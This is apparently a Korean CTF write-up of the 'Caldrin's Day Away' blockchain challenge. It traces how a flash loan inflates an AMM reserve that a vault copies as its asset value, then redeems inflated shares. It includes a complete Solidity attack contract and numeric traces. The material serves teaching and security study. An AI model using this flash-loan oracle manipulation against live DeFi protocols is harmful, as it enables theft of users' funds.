---
title: "Caldrin's Day Away — 오라클이 잔고를 그대로 반환할 때"
date: 2026-11-24
tags: ["blockchain", "defi", "solidity", "flash-loan", "oracle"]
categories: ["Cyber Apocalypse 2026"]
summary: "플래시 론으로 AMM 잔고를 부풀리고, 그 잔고를 자산 평가액으로 베끼는 금고에서 지분을 청구한다. 화이트리스트가 질의는 고정했지만 답은 고정하지 못했다."
translationKey: "caldrins-day-away"
---

## 개요

컨트랙트 일곱 개가 묶여 있다.

```
Setup                 배포·초기화·승리 판정
TradeToken            ERC-20 (CROWN, SALT) — decimals 6
DocksideMarket        AMM. 거래와 자산 평가를 겸한다
GoldhandCredit        플래시 론
PublicStampDesk       승인된 오라클 질의만 중계
DocksideSharehouse    타겟 금고
IQuayBorrower         플래시 론 콜백 인터페이스
```

승리 조건은 금고의 CROWN 잔고를 임계값 아래로 내리는 것이다.

```solidity
function isSolved() external view returns (bool) {
    return crownCoin.balanceOf(address(sharehouse)) < SOLVE_THRESHOLD;
}
```

## 1. 초기 상태

`Setup`의 생성자가 모든 수치를 박아 둔다.

| 항목 | 값 |
|---|---|
| market `crownReserve` / `saltReserve` | 1,000,000 / 1,000,000 |
| sharehouse CROWN 잔고 | 1,000,000 |
| sharehouse `recordedHoldings` | 1,000,000 |
| sharehouse `totalClaimMarks` | 990,000e18 (전량 `0xBEEF`) |
| goldhand CROWN 잔고 | 90,000,000 |
| travel purse | 10,000 |
| `SOLVE_THRESHOLD` | 150,000 |

CROWN과 SALT는 decimals 6인데 claim mark는 1e18 스케일이다. 지분 계산에서 `1e12` 배율이 끼는 이유다.

```solidity
if (totalClaimMarks == 0) {
    claimMarkAmount = crownCoinAmount * 1e12;
}
```

초기 지분이 `0xBEEF`에 전량 들어가 있어 이 분기는 실행되지 않는다. 0으로 나누기를 막는 용도다.

## 2. 오라클이 반환하는 값

`DocksideMarket`이 거래소와 평가기를 겸한다.

```solidity
function valueCargoAsOneGood(uint256 cargoMarkAmount, int128 good) external view returns (uint256) {
    require(good == 0 || good == 1, "UNKNOWN_GOOD");

    uint256 reserve = good == 0 ? crownReserve : saltReserve;

    return (cargoMarkAmount * reserve) / totalCargoMarks;
}
```

`Setup`이 승인하는 질의는 이것 하나다.

```solidity
bytes memory callData =
    abi.encodeWithSelector(DocksideMarket.valueCargoAsOneGood.selector, SHAREHOUSE_CARGO_POSITION, int128(0));
```

`SHAREHOUSE_CARGO_POSITION`과 `TOTAL_CARGO_MARKS`가 둘 다 `1_000_000e6`이다. 비율이 정확히 1이므로 이 함수는 **`crownReserve`를 그대로 반환한다.**

환율도 가격도 아니다. 금고가 자기 자산 가치로 쓰는 값이 거래소 한쪽 잔고의 사본이다.

`PublicStampDesk`는 승인된 바이트열만 `staticcall`로 중계한다. 그래서 cargo 수량이나 `good` 번호를 바꿔 다른 값을 물어볼 수는 없다. **질의는 고정되어 있지만 답은 고정되어 있지 않다.** 보호가 "무엇을 물어볼 수 있는가"에만 걸려 있고 "그 답을 믿어도 되는가"에는 없다.

## 3. 취약점

금고의 가치 갱신 함수에 검증이 없다.

```solidity
function recountHoldings(bytes calldata stampedOrder) external {
    bytes memory result = stampDesk.readStampedOrder(stampedOrder);

    uint256 newHoldings = abi.decode(result, (uint256));

    emit HoldingsRecounted(recordedHoldings, newHoldings);

    recordedHoldings = newHoldings;
}
```

권한 검사도, 변화율 상한도, 이전 값과의 비교도 없다. `external`이라 누구나 부를 수 있고 승인된 주문은 `setup.buildPublicRecountOrder()`로 공개되어 있다.

그리고 출금이 그 값에 비례한다.

```solidity
uint256 crownCoinAmount = (claimMarkAmount * recordedHoldings) / totalClaimMarks;
```

지분을 먼저 확보한 뒤 `recordedHoldings`를 키우면 같은 지분이 더 많은 CROWN을 뽑는다.

## 4. 설계된 제약 두 개

출제자가 막아 둔 것이 두 가지이고, 공격 순서가 거기서 결정된다.

**입금 상한.** 금고는 travel purse 크레딧 범위에서만 입금을 받는다.

```solidity
uint256 purseCredit = travelPurseCredit[msg.sender];
require(purseCredit >= crownCoinAmount, "NO_TRAVEL_PURSE");
travelPurseCredit[msg.sender] = purseCredit - crownCoinAmount;
```

크레딧은 `takeTravelPurse`가 발급하고 전체 실행에서 한 번만 가능하다.

```solidity
require(!travelPurseTaken, "PURSE_ALREADY_TAKEN");
travelPurseTaken = true;
crownCoin.mint(msg.sender, TRAVEL_PURSE);
sharehouse.creditTravelPurse(msg.sender, TRAVEL_PURSE);
```

`msg.sender`에게 코인과 크레딧이 같이 붙는다. 따라서 **공격 컨트랙트가 직접 호출해야 한다.** EOA로 먼저 받아버리면 크레딧이 EOA에 남아 컨트랙트가 입금할 수 없다.

입금액은 10,000개로 고정이다. 지분 비율을 늘리는 방향은 막혀 있고, 늘릴 수 있는 것은 `recordedHoldings`뿐이다.

**대출 중 입금 금지.**

```solidity
require(goldhandCredit.activeBorrower() == address(0), "LOAN_ACTIVE");
```

`onQuayLoan` 안에서는 `activeBorrower`가 세워져 있으므로 입금이 거부된다. 지분을 플래시 론 이전에 확보해야 한다.

이 가드가 없어도 순서는 같아야 한다. `leaveGoods`가 지분을 `recordedHoldings`로 나눠 계산하기 때문이다.

```solidity
claimMarkAmount = (crownCoinAmount * totalClaimMarks) / recordedHoldings;
```

부풀린 뒤에 입금하면 분모가 91배 커져 지분이 그만큼 줄어든다. 가드는 그 실수를 아예 불가능하게 만든 것이다.

## 5. 수치 추적

### 지분 확보

```
claimMarkAmount = 10_000e6 * 990_000e18 / 1_000_000e6 = 9_900e18
```

```
totalClaimMarks     990,000e18 → 999,900e18
recordedHoldings    1,000,000  → 1,010,000
금고 CROWN 잔고      1,000,000  → 1,010,000
지분 비율            9,900 / 999,900 = 0.990099%
```

### 시장 조작

플래시 론으로 90,000,000개를 빌려 전량 SALT로 교환한다.

```solidity
amountOut = (amountIn * reserveOut) / (reserveIn + amountIn);
```

```
amountOut   90,000,000 * 1,000,000 / 91,000,000 = 989,010.989 SALT
crownReserve  1,000,000 → 91,000,000
saltReserve   1,000,000 → 10,989.011
```

### 가치 갱신

```
recordedHoldings = crownReserve = 91,000,000
```

### 지분 청구

```
payout = 9_900e18 * 91,000,000 / 999_900e18 = 900,990.099 CROWN
금고 잔고 1,010,000 - 900,990.099 = 109,009.901
```

`109,009.901 < 150,000`이므로 통과한다. 금고를 비우는 것이 아니라 임계값 아래로 내리면 된다.

최대 대출을 써도 안전한지 확인해 둘 만하다. 출금액이 금고 잔고를 넘으면 `transfer`가 실패해 전체가 롤백된다. 비율이 0.990099%이므로 잔고 1,010,000을 초과하려면 `crownReserve`가 102,010,100을 넘어야 하는데, 유동성 전량을 빌려도 91,000,000이다. 여유가 있다.

## 6. 상환

redeem 직후 수중에는 CROWN 900,990개와 SALT 989,010개가 있다. 빚은 90,000,000개다. **SALT를 되팔지 않으면 상환이 불가능하다.**

```solidity
require(coin.balanceOf(address(this)) >= balanceBefore, "DEBT_NOT_RETURNED");
```

되팔면 거의 전액이 돌아온다. 교환 공식에 수수료가 없기 때문이다.

```solidity
return (amountIn * reserveOut) / (reserveIn + amountIn);
```

이 식은 `(reserveIn + amountIn) * (reserveOut - amountOut) = reserveIn * reserveOut`을 정확히 만족한다. 곱이 보존되므로 왕복 거래가 정수 나머지를 빼면 무손실이다. 수수료가 있는 AMM이라면 왕복에서 손실이 나 훔친 CROWN 일부를 상환에 써야 했을 것이다.

```
SALT 989,010.989 → CROWN 약 90,000,000
상환 후 보유       약 900,990 CROWN
```

## 7. 전체 흐름

```solidity
function attack() external {
    setup.takeTravelPurse();

    crown.approve(address(sharehouse), 10_000e6);
    sharehouse.leaveGoods(10_000e6);

    goldhand.borrowForOneCall(90_000_000e6, "");
}

function onQuayLoan(uint256 amount, bytes calldata) external override {
    crown.approve(address(market), amount);
    market.trade(0, 1, amount, 0);

    bytes memory stampedOrder = setup.buildPublicRecountOrder();
    sharehouse.recountHoldings(stampedOrder);

    uint256 myClaims = sharehouse.claimMarks(address(this));
    sharehouse.redeemClaim(myClaims);

    uint256 saltBalance = salt.balanceOf(address(this));
    salt.approve(address(market), saltBalance);
    market.trade(1, 0, saltBalance, 0);

    crown.transfer(address(goldhand), amount);
}
```

상환은 `transfer`로 직접 보낸다. 대부업체가 `balanceOf`만 비교하므로 approve/pull 경로가 필요하지 않다.

## 짚어둘 점

- 보호가 질의에만 걸려 있다. `PublicStampDesk`의 화이트리스트는 "어떤 함수를 어떤 인자로 부를 수 있는가"를 고정하지만, 그 함수가 같은 트랜잭션 안에서 바뀌는 상태를 읽는다는 점은 다루지 않는다. 승인 목록이 있어서 오히려 검증된 경로처럼 보인다.
- 평가 기준이 조작 가능한 상태 변수 하나다. `cargoMarkAmount == totalCargoMarks`라서 평가 함수가 `crownReserve`의 항등 사상이 된다. TWAP 부재라는 일반론보다 이 식 하나가 문제를 더 정확히 설명한다.
- 거래소와 평가기를 같은 컨트랙트가 겸한다. `trade`가 바꾸는 변수를 `valueCargoAsOneGood`이 읽는다. 둘을 분리하지 않은 것이 조작 가능성의 출처다.
- 제약이 공격 순서를 알려준다. `LOAN_ACTIVE` 가드가 "입금은 대출 전에"를 강제하고, travel purse 상한이 "지분 비율은 고정"을 강제한다. 남는 자유도가 `recordedHoldings` 하나뿐이라 공격 경로가 사실상 유일해진다.
- 수수료 없는 교환 공식이 상환을 가능하게 한다. 왕복 무손실이 아니면 대출 규모를 줄이거나 상환 재원을 따로 계산해야 한다.

---

전체 코드: [ctf-writeups/2026-cyber-apocalypse/caldrins-day-away](https://github.com/wjddml/ctf-writeups/tree/main/2026-cyber-apocalypse/caldrins-day-away)
